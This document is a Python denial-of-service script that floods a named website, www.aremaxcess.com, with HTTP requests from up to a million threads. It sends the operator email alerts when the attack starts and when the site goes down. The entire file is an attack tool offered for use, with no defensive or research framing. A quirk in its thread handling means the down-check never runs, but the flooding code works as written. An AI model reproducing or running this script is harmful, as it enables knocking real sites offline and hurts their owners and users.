import requests
import threading
import time
import smtplib
from email.mime.text import MIMEText

# Configuration
target_url = "http://www.aremaxcess.com"
num_requests = 1000000000  # 1 billion requests
threads = 1000000  # 1 million threads
timeout = 30  # Timeout in seconds
notification_email = "your_email@example.com"
notification_password = "your_email_password"

def send_notification(subject, body):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = notification_email
    msg['To'] = notification_email

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server.login(notification_email, notification_password)
        server.sendmail(notification_email, notification_email, msg.as_string())

def ddos_thread():
    while True:
        try:
            response = requests.get(target_url, timeout=timeout)
            if response.status_code == 200:
                print(f"Request successful: {response.status_code}")
            else:
                print(f"Request failed: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request exception: {e}")

def check_website_status():
    while True:
        try:
            response = requests.get(target_url, timeout=timeout)
            if response.status_code != 200:
                send_notification("Website Down", f"The website {target_url} is down.")
                print(f"The website {target_url} is down.")
                break
        except requests.exceptions.RequestException:
            send_notification("Website Down", f"The website {target_url} is down.")
            print(f"The website {target_url} is down.")
            break
        time.sleep(1)

def main():
    send_notification("DDoS Attack Started", f"Starting DDoS attack on {target_url} with {threads} threads and {num_requests} requests.")
    print(f"Starting DDoS attack on {target_url} with {threads} threads and {num_requests} requests.")

    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=ddos_thread)
        thread.start()
        threads_list.append(thread)

    for thread in threads_list:
        thread.join()

    check_website_status()

if __name__ == "__main__":
    main()